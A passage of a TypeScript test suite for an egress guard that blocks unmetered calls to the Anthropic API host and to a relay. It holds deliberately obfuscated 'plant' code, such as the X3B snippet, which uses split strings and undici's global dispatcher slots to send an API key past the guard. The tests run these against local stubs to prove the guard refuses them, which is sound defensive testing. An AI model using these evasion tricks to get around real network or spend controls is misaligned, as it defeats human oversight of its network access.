  it('APP_CSP names the relay origin as its one connect-src origin, and no API host', () => {
    expect(APP_CSP).toContain(`connect-src ${"'self'"} ${RELAY_ORIGIN};`);
    expect(APP_CSP).not.toContain(HOST);
  });

  it.each(names)('%s: refused with EgressRefusal, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error).toMatch(/egress guard/);
  });

  it('h-relay-url: the refusal is an EgressRefusal that names the relay origin', () => {
    expect(out.plants['h-relay-url']?.error).toMatch(new RegExp(`^EgressRefusal: egress guard: fetch to ${RELAY_ORIGIN} refused`));
  });
});

describe('with fetch and sendBeacon on prototypes (a browser Worker and page), the guard locks them there too', () => {
  const names = Object.keys(PROTO_PLANTS);
  const out = run(names, { client: true, allowed: [SELF, RELAY], metered: [RELAY], endpoint: RELAY_URL, proto: true });

  it('installs', () => {
    expect(out.guard).toBe('installed');
  });

  it.each(names.filter((n) => n !== 'p-proto-self-fetch'))('%s: refused with EgressRefusal, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error).toMatch(/egress guard/);
  });

  it('p-proto-self-fetch: the prototype fetch is the guarded one, so its own origin still answers with redirect: error', () => {
    expect(out.plants['p-proto-self-fetch']).toEqual({ sends: [{ api: 'fetch', host: 'app.test', redirect: 'error' }], error: null });
  });

  it('MessagesClient\'s own call to the relay passes, once', () => {
    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: 'relay.test' }] });
  });
});

// verifier-phase-P17i-P16h-web2r3-1 F2: Node's own WebSocket checks its EventTarget brand through
// the constructor's inherited statics, so the guarded constructor must keep EventTarget as its
// prototype. A real WebSocket under the guard to a closed local port: its methods still work, and
// one to the API host is refused.
describe('a real Node WebSocket under the guard', () => {
  it('keeps its EventTarget brand: addEventListener, onclose and close work; the API host is refused', () => {
    const dir = tempDir('egress-ws');
    write(dir, 'package.json', '{"type":"module"}');
    write(dir, 'ws.mjs', `const raw = globalThis.WebSocket;
const { installEgressGuard } = await import(process.env.EGRESS_MODULE);
installEgressGuard(globalThis);
const out = { notRaw: WebSocket !== raw && Object.getPrototypeOf(WebSocket) === Object.getPrototypeOf(raw) };
const ws = new WebSocket('ws://127.0.0.1:9/');
ws.addEventListener('error', () => {});
ws.onclose = () => {};
ws.close();
out.instance = ws instanceof WebSocket && ws instanceof EventTarget;
out.readyState = ws.readyState;
try { new WebSocket('wss://${HOST}/v1/messages'); out.api = 'sent'; } catch (e) { out.api = e.name + ': ' + e.message; }
process.stdout.write(JSON.stringify(out));
`);
    const r = spawnSync(process.execPath, ['ws.mjs'], { cwd: dir, env: { PATH: process.env.PATH ?? '', HOME: tempDir('egress-ws-home'), EGRESS_MODULE: repo('packages/core/egress.ts') }, encoding: 'utf8', timeout: 20_000 });
    expect(r.stderr).toBe('');
    expect(r.status).toBe(0);
    const out = JSON.parse(r.stdout) as { notRaw: boolean; instance: boolean; readyState: number; api: string };
    expect(out).toMatchObject({ notRaw: true, instance: true });
    expect([2, 3]).toContain(out.readyState);
    expect(out.api).toMatch(/^EgressRefusal: egress guard/);
  });
});

describe('entry points install the guard before anything else runs', () => {
  // The first top-level statements after the imports, by file. live-node.ts installs it as the
  // first statement of its run-as-script block, so importing it (tests do) changes no globals;
  // the probe page first keeps the fetch its relay forwards client Requests through.
  const firstStatements = (file: string, after?: RegExp) => {
    const lines = readFileSync(join(repoRoot, file), 'utf8').split('\n');
    const from = after ? lines.findIndex((l) => after.test(l)) + 1 : 0;
    return lines.slice(from).filter((l) => l.trim() !== '' && !l.trim().startsWith('//') && !/^import |^\s|^}|^\)|^declare /.test(l) || (after !== undefined && /^\s+\S/.test(l) && !l.trim().startsWith('//'))).map((l) => l.trim());
  };
  it.each([
    ['cli/index.ts', undefined, ['installEgressGuard(globalThis);']],
    // The page and the trial Worker hold hosted clients: the relay metered, their origin and the relay allowed (P16h).
    ['apps/web/src/main.tsx', undefined, ['installEgressGuard(globalThis, hostedGuard(location.origin));']],
    ['apps/web/src/probe/main.ts', undefined, ['const send = globalThis.fetch.bind(globalThis);', 'installEgressGuard(globalThis);']],
    // relayGuardOptions is {} unless relay-probe.html?relay= names a relay (P16h).
    ['apps/web/src/probe/relay-main.ts', undefined, ['installEgressGuard(globalThis, relayGuardOptions(location));']],
    ['apps/web/src/worker/trial.ts', undefined, ['installEgressGuard(globalThis, hostedGuard(location.origin));']],
    ['scripts/live-node.ts', /^if \(process\.argv\[1\]/, ['installEgressGuard(globalThis);']],
  ] as const)('%s installs the guard first', (file, after, expected) => {
    expect(firstStatements(file, after).slice(0, expected.length)).toEqual(expected);
  });

  it('pnpm live:node, run as a process with a stubbed network, sends its one call through the guard', () => {
    const dir = tempDir('egress-live');
    write(dir, 'stub.mjs', RUNNER.split('let guard')[0] + `const stubFetch = globalThis.fetch;\nprocess.on('exit', () => process.stderr.write('SENDS ' + JSON.stringify(sends) + ' WRAPPED ' + (globalThis.fetch !== stubFetch) + '\\n'));\n`);
    const home = tempDir('egress-home');
    const r = spawnSync(process.execPath, ['--import', pathToFileURL(join(dir, 'stub.mjs')).href, join(repoRoot, 'scripts/live-node.ts')], {
      cwd: repoRoot, encoding: 'utf8', env: { PATH: process.env.PATH ?? '', HOME: home, SPEND_LEDGER: join(home, 'spend.jsonl'), ANTHROPIC_API_KEY: fakeKey('L') },
    });
    expect(r.stdout).toContain('status 200');
    expect(/SENDS (.*)/.exec(r.stderr)?.[1]).toBe(`${JSON.stringify([{ api: 'fetch', host: HOST }])} WRAPPED true`);
    expect(r.status).toBe(1); // the stubbed reply has no tool_use
  });
});

describe('Node fetch never sees a dispatcher the caller passed', () => {
  // Real fetch against local servers. Each route hands fetch a dispatcher that reroutes the
  // connection from the checked host to a second server, the stand-in for the API host. Guard off
  // is the control: the same call reaches the second server.
  const CHILD = `
import { createServer } from 'node:http';
const listen = async (hits) => { const srv = createServer((req, res) => { hits.push(req.url); res.end('ok'); }); await new Promise((r) => srv.listen(0, '127.0.0.1', r)); return srv; };
const checkedHits = [], otherHits = [];
const checked = await listen(checkedHits), other = await listen(otherHits);
const otherOrigin = 'http://127.0.0.1:' + other.address().port;
const agent = globalThis[Symbol.for('undici.globalDispatcher.2')];
const used = [];
const dispatcher = { dispatch: (opts, handler) => { used.push('dispatch'); return agent.dispatch({ ...opts, origin: otherOrigin }, handler); } };
if (process.env.GUARD === '1') (await import(process.env.EGRESS_MODULE)).installEgressGuard(globalThis);
const url = 'http://127.0.0.1:' + checked.address().port + '/x';
const init = Object.assign(() => undefined, { dispatcher });
const routes = {
  init: () => fetch(url, { dispatcher }),
  'request-ctor': () => fetch(new Request(url, { dispatcher })),
  'request-copy': () => fetch(new Request(new Request(url, { dispatcher }))),
  'request-ctor-init-undefined': () => fetch(new Request(url, { dispatcher }), { dispatcher: undefined }),
  'init-function': () => fetch(url, init),
};
let error = null;
try { await (await routes[process.env.ROUTE]()).text(); } catch (e) { error = e.message; }
checked.close(); other.close();
process.stdout.write(JSON.stringify({ checked: checkedHits, other: otherHits, used, error }));
`;
  const runChild = (guard: boolean, route: string) => {
    const dir = tempDir('egress-dispatcher');
    write(dir, 'child.mjs', CHILD);
    const r = spawnSync(process.execPath, [join(dir, 'child.mjs')], {
      encoding: 'utf8', env: { PATH: process.env.PATH ?? '', GUARD: guard ? '1' : '0', ROUTE: route, EGRESS_MODULE: repo('packages/core/egress.ts') },
    });
    if (r.status !== 0) throw new Error(`child exited ${r.status}: ${r.stderr}`);
    return JSON.parse(r.stdout) as { checked: string[]; other: string[]; used: string[]; error: string | null };
  };
  const ROUTES = ['init', 'request-ctor', 'request-copy', 'request-ctor-init-undefined', 'init-function'];

  it.each(ROUTES)('guard on, %s: the request goes through the global dispatcher to the host fetch was given', (route) => {
    expect(runChild(true, route)).toEqual({ checked: ['/x'], other: [], used: [], error: null });
  });

  it.each(ROUTES)('control, guard off, %s: the passed dispatcher reroutes the request', (route) => {
    expect(runChild(false, route)).toEqual({ checked: [], other: ['/x'], used: ['dispatch'], error: null });
  });
});

describe('the guard owns undici\'s global dispatcher slots', () => {
  // Real undici against a local TLS stub. Before the guard installs, each child points undici's
  // global Agent at the stub, so a request to the API host lands there (SNI and Host intact)
  // instead of leaving the machine. Every route then reaches for the API host below fetch: the
  // slot dispatchers by each of their methods, the verifier's x3b plant (P2h-1), a fetch captured
  // before install, a redirect from another host and a swap of the slots. Guard off is the control.
  const certDir = tempDir('egress-tls');
  const openssl = spawnSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-days', '1', '-subj', '/CN=stub', '-keyout', join(certDir, 'key.pem'), '-out', join(certDir, 'cert.pem')], { encoding: 'utf8' });
  if (openssl.status !== 0) throw new Error(`openssl: ${openssl.stderr}`);

  // The plant from evidence/verifier-phase-P2h-1/plants/ev/x3b-runtime-name-on-globalthis-typed.ts.
  const X3B = `const HOST = ["api", "anthropic", "com"].join(".");
interface R { statusCode: number; body: { text(): Promise<string> } }
interface D { request(o: object): Promise<R> }
async function send(d: D | undefined, which: string, key: string): Promise<string> {
  if (!d || typeof d.request !== "function") return \`no dispatcher at .\${which}\`;
  const r = await d.request({ origin: \`https://\${HOST}\`, path: "/v1/messages", method: "POST", headers: { "x-api-key": key, "content-type": "application/json" }, body: "{}" });
  await r.body.text();
  return \`status \${r.statusCode}\`;
}
const keyOf = (which: string): string => [["un", "dici"].join(""), "globalDispatcher", which].join(".");
export async function run(which: string, key: string): Promise<string> {
  await fetch("data:,");
  const S = (globalThis as unknown as Record<string, unknown>)[["Sym", "bol"].join("")] as { for(k: string): symbol };
  return send(Reflect.get(globalThis, S.for(keyOf(which))) as D | undefined, which, key);
}
`;

  const CHILD = `
import { createServer } from 'node:https';
import { connect as tlsConnect } from 'node:tls';
import { readFileSync } from 'node:fs';
import { Writable } from 'node:stream';
const API = ['api', 'anthropic', 'com'].join('.');
const OTHER = 'example.test';
const RELAY = 'relay.test';
const KEY = process.env.KEY;
const S1 = Symbol.for('undici.globalDispatcher.1'), S2 = Symbol.for('undici.globalDispatcher.2');
const sse = (events) => events.map((e) => 'event: ' + e.type + '\\ndata: ' + JSON.stringify(e) + '\\n\\n').join('');
const OK = sse([
  { type: 'message_start', message: { id: 'm', model: 'claude-opus-5-5', role: 'assistant', content: [], stop_reason: null, usage: { input_tokens: 10, output_tokens: 1 } } },
  { type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 1 } },
  { type: 'message_stop' },
]);
const hits = [];
const hostOf = (req) => (req.headers.host ?? '').replace(/:\\d+$/, '').replace(/\\.$/, '').toLowerCase();
const server = createServer({ key: readFileSync(process.env.KEY_PEM), cert: readFileSync(process.env.CERT_PEM) }, (req, res) => {
  hits.push({ kind: 'request', host: hostOf(req) });
  req.resume();
  req.on('end', () => {
    if (req.url === '/redirect') { res.writeHead(307, { location: 'https://' + API + '/v1/messages' }); return res.end(); }
    if (req.url === '/redirect-relay') { res.writeHead(307, { location: 'https://' + RELAY + '/v1/messages' }); return res.end(); }
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    res.end(OK);
  });
});
server.on('secureConnection', (s) => hits.push({ kind: 'tls', host: s.servername ? s.servername.replace(/\\.$/, '').toLowerCase() : null }));
server.on('connect', (req, socket) => { hits.push({ kind: 'connect', host: hostOf(req) }); socket.end('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); });
server.on('upgrade', (req, socket) => { hits.push({ kind: 'upgrade', host: hostOf(req) }); socket.end('HTTP/1.1 101 Switching Protocols\\r\\nconnection: upgrade\\r\\nupgrade: websocket\\r\\n\\r\\n'); });
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const port = server.address().port;

// Point undici's global Agent (both slots, as setGlobalDispatcher does) at the stub.
await fetch('data:,');
const Agent = globalThis[S2].constructor, Legacy = globalThis[S1].constructor;
const toStub = (opts, cb) => {
  const s = tlsConnect({ host: '127.0.0.1', port, servername: opts.servername || opts.hostname, rejectUnauthorized: false, ALPNProtocols: ['http/1.1'] });
  s.once('secureConnect', () => cb(null, s));
  s.once('error', (e) => cb(e));
};
const stub = new Agent({ connect: toStub });
globalThis[S2] = stub;
globalThis[S1] = new Legacy(stub);
const early = globalThis.fetch;
if (process.env.GUARD === '1') (await import(process.env.EGRESS_MODULE)).installEgressGuard(globalThis, { meteredOrigins: ['https://' + RELAY] });

const POST = { method: 'POST', headers: { 'x-api-key': KEY, 'content-type': 'application/json' }, body: '{}' };
const apiOpts = () => ({ origin: 'https://' + API, path: '/v1/messages', ...POST });
const slot = (n) => globalThis[n === '1' ? S1 : S2];
const METHODS = {
  request: (d) => d.request(apiOpts()).then((r) => r.body.text()),
  dispatch: (d) => new Promise((resolve, reject) => d.dispatch(apiOpts(), {
    onRequestStart() {}, onResponseStart() {}, onResponseData() {}, onResponseEnd: () => resolve('end'), onResponseError: (_c, e) => reject(e),
  })),
  stream: (d) => d.stream(apiOpts(), () => new Writable({ write: (_c, _e, cb) => cb() })),
  pipeline: (d) => new Promise((resolve, reject) => {
    const p = d.pipeline(apiOpts(), ({ body }) => body);
    p.on('error', reject).on('data', () => undefined).on('end', () => resolve('end'));
    p.end();
  }),
  connect: (d) => d.connect({ origin: 'https://' + API, path: '/' }).then(({ socket }) => socket.destroy()),
  upgrade: (d) => d.upgrade({ origin: 'https://' + API, path: '/' }).then(({ socket }) => socket.destroy()),
  compose: (d) => d.compose((dispatch) => (opts, handler) => dispatch(opts, handler)).request(apiOpts()).then((r) => r.body.text()),
};
const routes = {
  'x3b-1': async () => (await import('./x3b.ts')).run('1', KEY),
  'x3b-2': async () => (await import('./x3b.ts')).run('2', KEY),
  'early-fetch-api': () => early('https://' + API + '/v1/messages', POST).then((r) => r.text()),
  'early-fetch-other': () => early('https://' + OTHER + '/ok').then((r) => r.status),
  'fetch-other': () => fetch('https://' + OTHER + '/ok').then((r) => r.status),
  redirect: () => fetch('https://' + OTHER + '/redirect', POST).then((r) => r.status),
  'relay-redirect': () => fetch('https://' + OTHER + '/redirect-relay', POST).then((r) => r.status),
  'relay-early-fetch': () => early('https://' + RELAY + '/v1/messages', POST).then((r) => r.text()),
  'relay-slot-request': () => slot('2').request({ ...apiOpts(), origin: 'https://' + RELAY }).then((r) => r.body.text()),
  'relay-slot-legacy-request': () => slot('1').request({ ...apiOpts(), origin: 'https://RELAY.TEST.' }).then((r) => r.body.text()),
  swap: async () => {
    const fresh = new Agent({ connect: toStub });
    const errors = [];
    for (const s of [S2, S1]) {
      try { globalThis[s] = fresh; } catch (e) { errors.push('assign: ' + e.constructor.name); }
      try { Object.defineProperty(globalThis, s, { value: fresh, writable: true, enumerable: false, configurable: false }); } catch (e) { errors.push('define: ' + e.constructor.name); }
    }
    const swapped = [S2, S1].map((s) => globalThis[s] === fresh);
    let sent = null;
    try { sent = (await early('https://' + API + '/v1/messages', POST)).status; } catch (e) { sent = e.cause?.message ?? e.message; }
    return { errors, swapped, sent };
  },
};
for (const n of ['1', '2']) for (const [m, call] of Object.entries(METHODS)) routes['slot' + n + '-' + m] = () => call(slot(n));
if (process.env.CLIENT === '1') routes.client = async () => {
  const { MessagesClient } = await import(process.env.CLIENT_MODULE);
  const { openNodeLedger } = await import(process.env.LEDGER_MODULE);
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  try { return (await new MessagesClient({ grant, ledger, apiKey: KEY, maxAttempts: 1 }).send([{ role: 'user', content: 'hi' }], { max_tokens: 1 })).status; } finally { await grant.close(); }
};

const message = (e) => [e?.message, e?.cause?.message].filter(Boolean).join(' / ');
const out = {};
for (const [name, call] of Object.entries(routes)) {
  const before = hits.length;
  let value = null, error = null;
  try {
    value = await Promise.race([call(), new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))]);
  } catch (e) { error = message(e); }
  const seen = hits.slice(before);
  // HTTP requests (CONNECT and Upgrade included) by Host, and TLS handshakes by SNI.
  const http = (host) => seen.filter((h) => h.kind !== 'tls' && h.host === host).length;
  out[name] = { api: http(API), apiTls: seen.filter((h) => h.kind === 'tls' && h.host === API).length, other: http(OTHER), relay: http(RELAY) + seen.filter((h) => h.kind === 'tls' && h.host === RELAY).length, value: value ?? null, error };
}
process.stdout.write(JSON.stringify({ routes: out, apiTotal: hits.filter((h) => h.kind !== 'tls' && h.host === API).length }));
process.exit(0);
`;

  type Route = { api: number; apiTls: number; other: number; relay: number; value: unknown; error: string | null };
  const runSlots = (guard: boolean) => {
    const dir = tempDir('egress-slots');
    write(dir, 'package.json', '{"type":"module"}');
    write(dir, 'child.mjs', CHILD);
    write(dir, 'x3b.ts', X3B);
    const home = tempDir('egress-home');
    const r = spawnSync(process.execPath, [join(dir, 'child.mjs')], {
      cwd: dir, encoding: 'utf8', env: {
        PATH: process.env.PATH ?? '', HOME: home, SPEND_LEDGER: join(home, 'spend.jsonl'), KEY: fakeKey('S'), GUARD: guard ? '1' : '0', CLIENT: '1',
        KEY_PEM: join(certDir, 'key.pem'), CERT_PEM: join(certDir, 'cert.pem'),
        EGRESS_MODULE: repo('packages/core/egress.ts'), CLIENT_MODULE: repo('packages/core/anthropic.ts'), LEDGER_MODULE: repo('cli/adapters/ledger-node.ts'),
      },
    });
    if (r.status !== 0) throw new Error(`child exited ${r.status}: ${r.stderr}`);
    return JSON.parse(r.stdout) as { routes: Record<string, Route>; apiTotal: number };
  };
  const on = runSlots(true);
  const off = runSlots(false);

  const METHODS = ['request', 'dispatch', 'stream', 'pipeline', 'connect', 'upgrade', 'compose'];
  const REFUSED = ['x3b-1', 'x3b-2', ...['1', '2'].flatMap((n) => METHODS.map((m) => `slot${n}-${m}`)), 'early-fetch-api', 'redirect'];

  it.each(REFUSED)('guard on, %s: refused, 0 requests reach the API stub', (name) => {
    const r = on.routes[name];
    expect(r?.api).toBe(0);
    expect(r?.apiTls).toBe(0);
    expect(r?.error).toMatch(/egress guard/);
  });

  it.each(REFUSED)('control, guard off, %s: reaches the API stub', (name) => {
    expect(off.routes[name]?.api).toBeGreaterThan(0);
  });

  // The relay as a metered origin (P16g): the slots refuse it like the API host.
  const RELAY_ROUTES = ['relay-redirect', 'relay-early-fetch', 'relay-slot-request', 'relay-slot-legacy-request'];
  it.each(RELAY_ROUTES)('guard on with meteredOrigins, %s: refused, 0 requests or handshakes reach the relay', (name) => {
    expect(on.routes[name]).toMatchObject({ relay: 0, error: expect.stringMatching(/egress guard/) });
  });

  it.each(RELAY_ROUTES)('control, guard off, %s: reaches the relay', (name) => {
    expect(off.routes[name]?.relay).toBeGreaterThan(0);
  });

  it('a redirect from another host is refused at the hop to the API host', () => {
    expect(on.routes.redirect).toMatchObject({ api: 0, apiTls: 0, other: 1 });
  });

  it('after install the slots cannot be swapped: each assignment and defineProperty throws, and the slots still refuse', () => {
    expect(on.routes.swap?.value).toEqual({
      errors: ['assign: TypeError', 'define: TypeError', 'assign: TypeError', 'define: TypeError'],
      swapped: [false, false],
      sent: expect.stringMatching(/egress guard/),
    });
    expect(on.routes.swap).toMatchObject({ api: 0, apiTls: 0 });
    expect(off.routes.swap?.value).toMatchObject({ errors: [], swapped: [true, true], sent: 200 });
  });

  it('a fetch with no dispatcher of its own goes through the guarded slot: another host answers, the API host is refused', () => {
    expect(on.routes['early-fetch-other']).toMatchObject({ api: 0, apiTls: 0, other: 1, value: 200, error: null });
    expect(on.routes['fetch-other']).toMatchObject({ api: 0, apiTls: 0, other: 1, value: 200, error: null });
    expect(on.routes['early-fetch-api']).toMatchObject({ api: 0, apiTls: 0, value: null });
  });

  it('MessagesClient still sends exactly once, the only request from this process the API stub saw', () => {
    expect(on.routes.client).toMatchObject({ api: 1, other: 0, value: 200, error: null });
    expect(on.apiTotal).toBe(1);
  });
});
